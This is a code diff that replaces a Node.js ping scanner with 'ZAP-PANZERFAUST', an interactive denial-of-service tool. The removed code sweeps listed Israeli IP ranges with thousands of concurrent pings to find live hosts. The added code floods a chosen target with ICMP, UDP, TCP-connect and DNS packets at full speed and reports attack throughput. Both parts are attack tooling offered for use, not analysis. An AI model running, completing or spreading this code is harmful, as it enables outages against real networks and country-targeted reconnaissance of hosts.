@@ -1,106 +1,169 @@
-const { exec } = require('child_process');
-const os = require('os');
-const fs = require('fs');
+// zap.js - ZAP-PANZERFAUST (L4 TOOL)
+const readline = require('readline');
+const raw = require('raw-socket');
+const dgram = require('dgram');
+const process = require('process');
 
-// Israeli IP blocks (expanded)
-const israelCIDRBlocks = [
-  "5.0.0.0/16", "31.154.0.0/16", "37.142.0.0/16", "62.90.0.0/16",
-  "77.125.0.0/16", "79.179.0.0/16", "85.64.0.0/16", "94.159.0.0/16",
-  "109.64.0.0/16", "132.72.0.0/16", "147.235.0.0/16", "176.12.0.0/16",
-  "185.32.0.0/16", "192.114.0.0/16", "212.179.0.0/16", "213.8.0.0/16",
-  // Add more if needed
-];
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
-const RESULTS_FILE = 'TXT.txt';
-const CONCURRENT_SCANS = 7000; // 2000 pings at once
-const LOG_EVERY = 4000; // Log every 4000 IPs checked
+const clear = () => process.stdout.write('\x1Bc');
+const prompt = (q) => new Promise(res => rl.question(q, res));
 
-// Clear old results
-if (fs.existsSync(RESULTS_FILE)) {
-  fs.unlinkSync(RESULTS_FILE);
-}
+const randomPort = () => Math.floor(Math.random() * (65535 - 1024)) + 1024;
+const randomDuration = () => Math.floor(Math.random() * 61) + 60;
 
-// Fast IP generator from CIDR
-function* generateIPs(cidr) {
-  const [network, mask] = cidr.split('/');
-  const ipParts = network.split('.').map(Number);
-  const networkAddr = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
-  const broadcastAddr = networkAddr | (0xFFFFFFFF >>> parseInt(mask));
-  
-  for (let ip = networkAddr + 1; ip < broadcastAddr; ip++) {
-    yield [
-      (ip >>> 24) & 0xFF,
-      (ip >>> 16) & 0xFF,
-      (ip >>> 8) & 0xFF,
-      ip & 0xFF
-    ].join('.');
-  }
-}
+let intervalLog;
 
-// Ping function (cross-platform)
-function ping(ip) {
-  return new Promise((resolve) => {
-    const platform = os.platform();
-    const command = platform === 'win32' 
-      ? `ping -n 1 -w 1000 ${ip}`
-      : `ping -c 1 -W 1 ${ip}`;
+const formatData = (bytes) => (bytes / 1024).toFixed(2) + ' KB';
+const formatMB = (bytes) => (bytes / 1024 / 1024).toFixed(2) + ' MB';
 
-    exec(command, (error, stdout, stderr) => {
-      resolve(!error && stdout.includes('TTL='));
-    });
-  });
-}
+const stats = {
+    packets: 0,
+    data: 0,
+    lost: 0,
+    success: 0,
+    startTime: null,
+    maxPPS: 0,
+    maxBPS: 0,
+};
 
-// Scan a CIDR block
-async function scanBlock(cidr) {
-  const ips = [...generateIPs(cidr)];
-  const totalIPs = ips.length;
-  let checked = 0;
-  let pingable = 0;
+async function init() {
+    clear();
+    console.log("jrl@zap.live >");
+    const cmd = (await prompt("Command > ")).toUpperCase();
 
-  console.log(`\n[+] Scanning ${cidr} (${totalIPs.toLocaleString()} IPs)`);
-
-  // Batch processing for better concurrency control
-  for (let i = 0; i < ips.length; i += CONCURRENT_SCANS) {
-    const batch = ips.slice(i, i + CONCURRENT_SCANS);
-    const results = await Promise.all(batch.map(ip => ping(ip)));
-
-    for (let j = 0; j < results.length; j++) {
-      checked++;
-      if (results[j]) {
-        pingable++;
-        fs.appendFileSync(RESULTS_FILE, `${batch[j]}\n`);
-      }
-
-      // Log progress
-      if (checked % LOG_EVERY === 0) {
-        console.log(`[${cidr}] ${checked.toLocaleString()}/${totalIPs.toLocaleString()} checked | ${pingable} pingable`);
-      }
+    const isIRIR = cmd === 'IRIR-PANZERFAUST';
+    if (!["UDP-NUKE", "ICMP-NUKE", "TCP-NUKE", "DNS-NUKE", "IRIR-PANZERFAUST"].includes(cmd)) {
+        console.log("Invalid Command");
+        process.exit(1);
     }
-  }
 
-  return { checked, pingable };
+    const target = await prompt("[¿T] > ");
+    const udpPort = isIRIR ? await prompt("[¿U-P] > ") : await prompt("[¿P] > ");
+    const tcpPort = isIRIR ? await prompt("[¿T-P] > ") : null;
+    const dnsPort = isIRIR ? await prompt("[¿D-P] > ") : null;
+    const duration = parseInt(await prompt("[¿DU-!] > ")) || randomDuration();
+
+    stats.startTime = Date.now();
+    const endTime = stats.startTime + (duration * 1000);
+
+    clear();
+    intervalLog = setInterval(() => printLog(cmd), Math.floor(Math.random() * 2000) + 4000);
+
+    switch (cmd) {
+        case "ICMP-NUKE": return icmpNuke(target, endTime);
+        case "UDP-NUKE": return udpNuke(target, udpPort || randomPort(), endTime);
+        case "TCP-NUKE": return tcpNuke(target, tcpPort || randomPort(), endTime);
+        case "DNS-NUKE": return dnsNuke(target, dnsPort || 53, endTime);
+        case "IRIR-PANZERFAUST": return irirAll(target, udpPort, tcpPort, dnsPort, endTime);
+    }
 }
 
-// Main scanner
-async function main() {
-  console.log('🔥 ISRAELI IP SCANNER (Node.js) 🔥');
-  console.log(`Threads: ${CONCURRENT_SCANS} | Logging every ${LOG_EVERY} IPs\n`);
+function icmpNuke(target, endTime) {
+    const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
+    const buffer = Buffer.alloc(64);
+    buffer.writeUInt8(8, 0);
+    buffer.writeUInt8(0, 1);
 
-  let totalChecked = 0;
-  let totalPingable = 0;
-
-  for (const block of israelCIDRBlocks) {
-    const { checked, pingable } = await scanBlock(block);
-    totalChecked += checked;
-    totalPingable += pingable;
-    console.log(`[+] ${block} done: ${pingable}/${checked} pingable`);
-  }
-
-  console.log(`\n✅ SCAN COMPLETE!`);
-  console.log(`Total: ${totalPingable}/${totalChecked} pingable IPs`);
-  console.log(`Results saved to ${RESULTS_FILE}`);
+    const blast = () => {
+        if (Date.now() > endTime) return endAttack();
+        try {
+            socket.send(buffer, 0, buffer.length, target, () => { });
+            stats.packets++;
+            stats.success++;
+            stats.data += buffer.length;
+        } catch (e) {
+            stats.lost++;
+        }
+        setImmediate(blast);
+    };
+    blast();
 }
 
-// Run it
-main().catch(console.error);
+function udpNuke(target, port, endTime) {
+    const sock = dgram.createSocket("udp4");
+    const buffer = Buffer.alloc(1400);
+    const blast = () => {
+        if (Date.now() > endTime) return endAttack();
+        sock.send(buffer, 0, buffer.length, port, target, (err) => {
+            if (!err) {
+                stats.packets++;
+                stats.data += buffer.length;
+            }
+        });
+        setImmediate(blast);
+    };
+    blast();
+}
+
+function tcpNuke(target, port, endTime) {
+    const net = require('net');
+    const blast = () => {
+        if (Date.now() > endTime) return endAttack();
+        const client = new net.Socket();
+        client.connect(port, target, () => {
+            stats.packets++;
+            stats.data += 64;
+            client.destroy();
+        });
+        client.on('error', () => {});
+        setImmediate(blast);
+    };
+    blast();
+}
+
+function dnsNuke(target, port, endTime) {
+    const sock = dgram.createSocket("udp4");
+    const buffer = Buffer.from("\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01", 'hex');
+    const blast = () => {
+        if (Date.now() > endTime) return endAttack();
+        sock.send(buffer, 0, buffer.length, port, target, (err) => {
+            if (!err) {
+                stats.packets++;
+                stats.data += buffer.length;
+            }
+        });
+        setImmediate(blast);
+    };
+    blast();
+}
+
+function irirAll(target, uPort, tPort, dPort, endTime) {
+    udpNuke(target, uPort || randomPort(), endTime);
+    tcpNuke(target, tPort || randomPort(), endTime);
+    dnsNuke(target, dPort || 53, endTime);
+    icmpNuke(target, endTime);
+}
+
+function printLog(mode) {
+    const now = Date.now();
+    const seconds = (now - stats.startTime) / 1000;
+    const pps = (stats.packets / seconds).toFixed(0);
+    const bps = (stats.data / seconds);
+    stats.maxPPS = Math.max(stats.maxPPS, pps);
+    stats.maxBPS = Math.max(stats.maxBPS, bps);
+
+    clear();
+    console.log(`ZAP-PANZERFAUST [${mode}]`);
+    console.log(`Packets:         ${stats.packets}`);
+    console.log(`Data sent:       ${formatMB(stats.data)}`);
+    if (mode.includes("ICMP")) {
+        console.log(`Lost:            ${stats.lost}`);
+        console.log(`Success:         ${stats.success}`);
+    }
+    console.log(`Data/sec:        ${formatData(bps)}`);
+    console.log(`Packets/sec:     ${pps}`);
+}
+
+function endAttack() {
+    clearInterval(intervalLog);
+    printLog("DONE");
+    console.log("\nATTACK COMPLETE");
+    console.log("ACCEPTED:", stats.success || stats.packets);
+    console.log("DENIED: ", stats.lost);
+    console.log("MAX PPS: ", stats.maxPPS);
+    console.log("MAX BANDWIDTH: ", formatData(stats.maxBPS));
+    process.exit(0);
+}
+
+init();
